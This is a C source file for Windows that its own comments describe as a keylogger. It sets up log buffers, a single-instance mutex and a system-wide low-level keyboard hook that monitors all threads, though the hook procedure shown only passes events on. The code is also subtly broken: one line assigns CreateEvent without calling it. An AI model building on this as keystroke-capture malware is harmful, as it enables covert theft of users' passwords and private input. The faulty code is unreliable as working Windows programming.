/*
 *
 */

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winuser.h>
#include "UseTracker.h"

#define NAME "make_me_crazy"

HHOOK ghHook = NULL; // NOTE - gh stands for global handle
HANDLE ghMutex = NULL;

HANDLE ghLogHeap = NULL;
PSTR pLogBuff = NULL; // pointer to a string, in this case, the key logger buffer
DWORD dwLogBuffSize = 0; // double word  - 32 bit unsigned integer, to hold size of key log buffer

HANDLE ghTempHeap = NULL;
PSTR pTempBuff = NULL;

HANDLE hTempBuffHasData = NULL;
HANDLE hTempBuffNoData = NULL;




DWORD WINAPI make_me_crazy()
{

	// Check to see if keylogger already running, if it is, return an error value
	if((ghMutex = CreateMutex(NULL, TRUE, NAME)) == NULL)
	{
		return(-1);
	} 

	// automatically clean up memory at program termination
	atexit((VOID *)clean);
	
	// allocate a heap for the 
	ghLogHeap = HeapCreate(0, 1024 + 1, 0);
	pLogBuff = (PSTR)HeapAlloc(ghLogHeap, HEAP_ZERO_MEMORY, 1024 + 1);
	dwLogBuffSize = 1024 + 1;

	ghTempHeap = HeapCreate(0, dwLogBuffSize, 0);
	pTempBuff = (PSTR)HeapAlloc(ghTempHeap, HEAP_ZERO_MEMORY, dwLogBuffSize);

	hTempBuffHasData = CreateEvent(NULL, TRUE, FALSE, NULL);
	hTempBuffNoData = CreateEvent;

	/** INSTALLS A HOOK PROCEDURE INTO A HOOK CHAIN - MONITORS CERTAIN THREADS FOR EVENTS
	 * Type of hook procedure - monitoring low-level keyboard input
	 * Pointer to hook procedure - points to a DLL procedure OR a hook procedure in process code
	 * handle to DLL containing hook procedure pointed to by previous param OR NULL if thread is created by current process
	 * thread identifier - if 0, associated with all existing threads
     * Returns: HHOOK (handle to hook procedure)
	**/
	if ((ghHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0)) == NULL)
	{
		return(-2);
	}

	MSG msg;

	while (GetMessage(&msg, 0, 0, 0) !=  0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(ghHook);
	return(0);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void clean()
{
	if (pLogBuff && ghLogHeap)
	{
		HeapFree(ghLogHeap, 0, pLogBuff);
		HeapDestroy(ghLogHeap);
	}
	if (ghHook) UnhookWindowsHookEx(ghHook);
	if (ghMutex) CloseHandle(ghMutex);
	if (pTempBuff && ghTempHeap)
	{
		HeapFree(ghTempHeap, 0, pTempBuff);
		HeapDestroy(ghTempHeap);
	}
}
